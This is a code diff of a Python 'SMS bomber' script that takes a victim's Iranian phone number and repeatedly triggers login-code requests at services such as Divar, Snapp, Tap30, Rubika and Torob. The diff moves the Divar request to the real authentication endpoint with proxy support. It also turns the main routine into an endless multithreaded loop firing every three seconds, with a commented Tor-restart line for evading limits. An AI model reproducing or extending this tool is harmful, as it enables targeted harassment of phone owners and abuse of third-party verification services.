@@ -22,30 +22,24 @@ def snap(phone):
 
 def divar(phone):
     #divar api
-    headers = {
-    "Accept": "application/json, text/plain, */*",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Accept-Language": "en-US,en;q=0.5",
-    "Content-Type": "application/x-www-form-urlencoded",
-    "Host": "api.divar.ir",
-    "Origin": "https://divar.ir",
+    divarh ={"Host": "api.divar.ir", "content-length" : "65", "User-Agent" : "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36"
+    ,"Accept": "application/json, text/plain, */*","Content-Type": "application/x-www-form-urlencoded", "Origin": "https://divar.ir",
     "Referer": "https://divar.ir/",
     "Sec-Fetch-Dest": "empty",
     "Sec-Fetch-Mode": "cors",
     "Sec-Fetch-Site": "same-site",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
-}
-
-data = {"cellphone":"phone"}
-try:
-    response = requests.post(url, headers=headers, data=data)
-    if response.status_code == 200:
-        print("Success!")
-        print("Response:", response.text)
-    else:
-        print("Error! Status code:", response.status_code)
-except Exception as e:
-    print("An error occurred:", e)
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
+    "Accept-Language":"en-US,en;q=0.5"}
+    data = {"cellphone":"phone"}
+    try:
+        response = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=divarh , data=data , proxies=proxy)
+        if response.status_code == 200:
+            print("Success!")
+            print("Response:", response.text)
+        else:
+            print("Error! Status code:", response.status_code)
+    except Exception as e:
+            print("An error occurred:", e)
 
     
 def shad(phone):
@@ -137,17 +131,20 @@ def bama(phone):
 
 def main():
     phone = str(input("Made by baji inter phone number (+98xxxxxxx): "))
-    snap(phone)
-    shad(phone)
-    gap(phone)
-    tap30(phone)
-    emtiaz(phone)
-    divar(phone)
-    rubika(phone)
-    torob(phone)
-    bama(phone)
+    while True:
+        Thread(target=snap, args=[phone]).start()
+        Thread(target=divar, args=[phone]).start()
+        Thread(target=gap, args=[phone]).start()
+        Thread(target=tap30, args=[phone]).start()
+        Thread(target=emtiaz, args=[phone]).start()
+        Thread(target=shad, args=[phone]).start()
+        Thread(target=rubika, args=[phone]).start()
+        Thread(target=torob, args=[phone]).start()
+        Thread(target=bama, args=[phone]).start()
 
-    # os.system("killall -HUP tor")
+        # os.system("killall -HUP tor")
+        time.sleep(3)
+
 
 if __name__ == "__main__":
     main()
